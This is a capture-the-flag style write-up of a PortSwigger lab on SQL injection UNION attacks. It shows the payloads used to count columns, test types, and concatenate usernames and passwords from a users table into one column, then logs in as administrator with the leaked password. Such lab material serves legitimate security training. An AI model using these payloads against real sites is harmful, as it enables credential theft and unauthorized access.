# UNION attack, retrieving multiple values in a single column

Lab: [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

### Description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

### Steps

First, we know there are only 2 columns and not 3, since `category=Pets' ORDER BY 2--` doesn’t return an error, but `category=Pets' ORDER BY 3--` does.

We also know that the returned columns are an Integer and a String, since the following query works without any errors: `category=Pets' UNION SELECT 1, 'a'--`

Therefore, we need to extract the username and password columns, which are usually two separate columns of data type String, from a single column.

You can concatenate multiple strings together to create a single string, using the syntax provided below:

| Database   | Syntax                                                                                                              |
| ---------- | ------------------------------------------------------------------------------------------------------------------- |
| Oracle     | `'foo'\\|'bar'`                                                                                                     |
| Microsoft  | `'foo'+'bar'`                                                                                                       |
| PostgreSQL | `'foo'\\|'bar'`                                                                                                     |
| MySQL      | <p><code>'foo' 'bar'</code> <em>Note the space between the two strings</em><br><code>CONCAT('foo','bar')</code></p> |

Based on this, let’s concatenate the username and password and separate them with a `~`, using the following injection: `category=Pets' UNION SELECT NULL, username || '~' || password FROM users--`

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Et voilà! The returned string is `administrator~f286lusiqzjnv720jo3k`. Let’s test it out:\


<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

and it’s solved!
